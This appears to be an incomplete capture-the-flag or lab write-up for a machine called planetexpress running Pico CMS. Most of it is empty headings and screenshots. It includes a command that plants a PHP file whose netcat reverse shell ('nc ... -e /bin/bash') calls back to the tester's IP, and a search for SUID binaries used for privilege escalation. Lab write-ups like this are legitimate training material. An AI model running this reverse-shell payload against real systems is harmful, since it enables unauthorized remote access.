#InProgress 

## Nmap
```

```

## Nmap UDP


# Enumeration

## HTTP

https://github.com/picocms/Pico/blob/master/plugins/DummyPlugin.php

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923171831.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923171757.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923172242.png?raw=true)

```
python fpm.py express.pg /var/www/html/planetexpress/plugins/PicoTest.php -c "<?php passthru('nc 192.168.45.200 80 -e /bin/bash');?>"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923190339.png?raw=true)

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923190627.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923191257.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923193705.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923193856.png?raw=true)


# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

